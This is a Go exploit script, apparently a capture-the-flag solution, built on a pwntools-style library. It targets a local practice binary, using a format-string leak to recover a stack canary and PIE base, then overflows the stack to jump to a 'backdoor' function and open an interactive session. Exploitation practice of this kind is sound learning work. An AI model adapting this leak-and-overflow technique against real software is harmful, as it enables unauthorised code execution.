package main

import (
	"bytes"
	"fmt"

	"github.com/ret2ntr/gpwntools"
)

func main() {
	file_name := "./target/test"
	elf ,err := gpwntools.ELF(file_name)
	if err != nil {
		panic(err)
	}
	if err != nil {
		panic(err)
	}
	defer elf.Close()
	//p, _, err := gpwntools.GDBDebug([]string{file_name}, "b vuln\n continue")
	p,err :=gpwntools.Process("./target/test")
	if err != nil {
		panic(err)
	}
	defer p.Close()
	if _, err := p.SendLineAfter([]byte("input your name >\n"), []byte("%21$p%15$p")); err != nil {
		panic(err)
	}
	//fmt.Printf("%x",elf.Symbols["backdoor"])
	p.RecvUntil([]byte("0x"))	
	main_addr, err := p.RecvUntil([]byte("0x"),true)
	if err != nil {
		panic(err)
	}
	fmt.Printf("main_addr :%s \n", main_addr)
	canary ,err :=p.Recv(16)
	if err != nil {
		panic(err)
	}
	fmt.Printf("canary :%s \n",canary)
	main_addr_int ,err := gpwntools.ParseHexUint64(main_addr)
	if err != nil {
		panic(err)
	}
	base_addr := uint64(main_addr_int)-elf.Symbols["main"]
	fmt.Printf("base_addr : %x \n", base_addr)
	canary_int, err := gpwntools.ParseHexUint64(canary)
	if err != nil {
		panic(err)
	}
	elf.SetBase(base_addr)
	backdoor := elf.Symbols["backdoor"]
	payload := bytes.Repeat([]byte("a"),0x38)
	payload = append(payload, gpwntools.Gp64(canary_int)...)
	payload = append(payload,gpwntools.Gp64(0)...)
	ret_code,err :=gpwntools.Asm("ret")
	if err != nil {
		panic(err)
	}
	ret_addr ,_ := elf.SearchExecutable(ret_code)
	//ret_addr := 0x101a+base_addr
	fmt.Println("len of ret_gadget:",len(ret_addr))
	payload = append(payload, gpwntools.Gp64(ret_addr[0])...)
	payload = append(payload, gpwntools.Gp64(backdoor)...)
	p.SendAfter([]byte(">"),payload)
	//gpwntools.Gu64(p.RecvLine())
	p.Interactive()
}
